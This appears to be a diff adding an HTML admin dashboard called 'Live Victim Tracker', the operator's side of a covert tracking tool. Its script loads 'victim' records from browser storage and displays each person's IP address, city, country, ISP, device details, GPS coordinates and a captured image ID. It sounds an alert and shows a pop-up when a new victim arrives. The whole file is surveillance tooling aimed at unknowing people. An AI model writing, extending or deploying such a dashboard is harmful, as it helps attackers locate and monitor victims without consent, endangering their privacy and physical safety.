@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Live Victim Tracker</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: 'Courier New', monospace;
+            background: #0f0f0f;
+            color: #00ff00;
+            overflow-x: hidden;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            padding: 20px;
+            background: #1a1a1a;
+            border-bottom: 2px solid #00ff00;
+            margin-bottom: 20px;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .stat-card {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            text-align: center;
+        }
+        .stat-number {
+            font-size: 2em;
+            color: #00ff00;
+            font-weight: bold;
+        }
+        .victims-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+        }
+        .victim-card {
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            padding: 15px;
+            transition: all 0.3s ease;
+        }
+        .victim-card.new {
+            border-color: #ff4444;
+            background: #2a1a1a;
+            animation: pulse-red 2s infinite;
+        }
+        .victim-header {
+            display: flex;
+            justify-content: between;
+            align-items: center;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #333;
+        }
+        .victim-id {
+            color: #00ff00;
+            font-weight: bold;
+        }
+        .victim-time {
+            color: #888;
+            font-size: 0.8em;
+        }
+        .victim-info {
+            margin: 5px 0;
+            font-size: 0.9em;
+        }
+        .victim-ip {
+            color: #ff4444;
+            font-weight: bold;
+        }
+        .victim-location {
+            color: #8888ff;
+        }
+        .victim-gps {
+            color: #ff8844;
+        }
+        .alert-sound {
+            display: none;
+        }
+        @keyframes pulse-red {
+            0% { border-color: #ff4444; }
+            50% { border-color: #ff0000; }
+            100% { border-color: #ff4444; }
+        }
+        @keyframes newVictim {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.02); }
+            100% { transform: scale(1); }
+        }
+        .new-victim-alert {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #ff4444;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            animation: newVictim 0.5s ease;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>🕵️ LIVE VICTIM TRACKER</h1>
+        <p>Real-time monitoring active - Victims appear automatically</p>
+    </div>
+
+    <div class="container">
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number" id="totalVictims">0</div>
+                <div>Total Victims</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="todayVictims">0</div>
+                <div>Today</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="activeNow">0</div>
+                <div>Active Now</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="withGPS">0</div>
+                <div>With GPS</div>
+            </div>
+        </div>
+
+        <div id="victimsContainer" class="victims-grid">
+            <!-- Victims will appear here automatically -->
+        </div>
+    </div>
+
+    <audio id="alertSound" class="alert-sound" src="data:audio/wav;base64,UklGRigAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQQAAAAAAA=="></audio>
+
+    <script>
+        const VICTIM_STORAGE = 'victimTrackingData';
+        let victims = [];
+        let lastUpdate = 0;
+
+        function initAdminPanel() {
+            loadVictims();
+            startRealTimeMonitoring();
+            updateStats();
+            renderVictims();
+        }
+
+        function loadVictims() {
+            const stored = localStorage.getItem(VICTIM_STORAGE);
+            victims = stored ? JSON.parse(stored) : [];
+        }
+
+        function startRealTimeMonitoring() {
+            // Check for new victims every second
+            setInterval(() => {
+                const lastVictimUpdate = localStorage.getItem('lastVictimUpdate');
+                if (lastVictimUpdate && parseInt(lastVictimUpdate) > lastUpdate) {
+                    lastUpdate = parseInt(lastVictimUpdate);
+                    
+                    const newVictim = localStorage.getItem('newVictimAlert');
+                    if (newVictim) {
+                        const victimData = JSON.parse(newVictim);
+                        handleNewVictim(victimData);
+                        localStorage.removeItem('newVictimAlert');
+                    }
+                    
+                    loadVictims();
+                    updateStats();
+                    renderVictims();
+                }
+            }, 1000);
+
+            // Also check for storage changes
+            window.addEventListener('storage', function(e) {
+                if (e.key === VICTIM_STORAGE || e.key === 'newVictimAlert') {
+                    loadVictims();
+                    updateStats();
+                    renderVictims();
+                }
+            });
+        }
+
+        function handleNewVictim(victimData) {
+            // Play alert sound (simple beep)
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+                
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+                
+                oscillator.frequency.value = 800;
+                oscillator.type = 'sine';
+                gainNode.gain.value = 0.1;
+                
+                oscillator.start();
+                gainNode.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.5);
+                oscillator.stop(audioCtx.currentTime + 0.5);
+            } catch (e) {}
+            
+            // Show visual alert
+            showNewVictimAlert(victimData);
+        }
+
+        function showNewVictimAlert(victim) {
+            const alert = document.createElement('div');
+            alert.className = 'new-victim-alert';
+            alert.innerHTML = `🚨 NEW VICTIM #${victim.id}<br>IP: ${victim.ip}<br>Location: ${victim.location.city}, ${victim.location.country}`;
+            document.body.appendChild(alert);
+            
+            setTimeout(() => {
+                alert.remove();
+            }, 5000);
+        }
+
+        function updateStats() {
+            const now = new Date();
+            const today = now.toDateString();
+            
+            const total = victims.length;
+            const todayCount = victims.filter(v => new Date(v.timestamp).toDateString() === today).length;
+            const activeLastHour = victims.filter(v => (now - new Date(v.timestamp)) < 3600000).length;
+            const withGPS = victims.filter(v => v.gps.success).length;
+            
+            document.getElementById('totalVictims').textContent = total;
+            document.getElementById('todayVictims').textContent = todayCount;
+            document.getElementById('activeNow').textContent = activeLastHour;
+            document.getElementById('withGPS').textContent = withGPS;
+        }
+
+        function renderVictims() {
+            const container = document.getElementById('victimsContainer');
+            container.innerHTML = '';
+            
+            victims.slice(0, 50).forEach(victim => {
+                const card = document.createElement('div');
+                card.className = 'victim-card';
+                if ((Date.now() - new Date(victim.timestamp)) < 30000) {
+                    card.classList.add('new');
+                }
+                
+                card.innerHTML = `
+                    <div class="victim-header">
+                        <span class="victim-id">VICTIM #${victim.id.substr(-6)}</span>
+                        <span class="victim-time">${new Date(victim.timestamp).toLocaleTimeString()}</span>
+                    </div>
+                    <div class="victim-info">
+                        <span class="victim-ip">🌐 ${victim.ip}</span>
+                    </div>
+                    <div class="victim-info">
+                        <span class="victim-location">📍 ${victim.location.city}, ${victim.location.country}</span>
+                    </div>
+                    <div class="victim-info">
+                        🏢 ${victim.location.isp}
+                    </div>
+                    <div class="victim-info">
+                        💻 ${victim.device.platform} | ${victim.device.screen}
+                    </div>
+                    ${victim.gps.success ? `
+                    <div class="victim-info">
+                        <span class="victim-gps">📍 ${victim.gps.latitude}, ${victim.gps.longitude}</span>
+                    </div>
+                    <div class="victim-info">
+                        🎯 Accuracy: ${victim.gps.accuracy}
+                    </div>
+                    ` : '<div class="victim-info">❌ GPS: Blocked</div>'}
+                    <div class="victim-info">
+                        📸 Image: #${victim.imageId}
+                    </div>
+                    <div class="victim-info">
+                        🕒 ${new Date(victim.timestamp).toLocaleString()}
+                    </div>
+                `;
+                
+                container.appendChild(card);
+            });
+        }
+
+        // Initialize when page loads
+        document.addEventListener('DOMContentLoaded', initAdminPanel);
+
+        console.log('🕵️ Admin panel active - Monitoring for victims...');
+    </script>
+</body>
+</html>
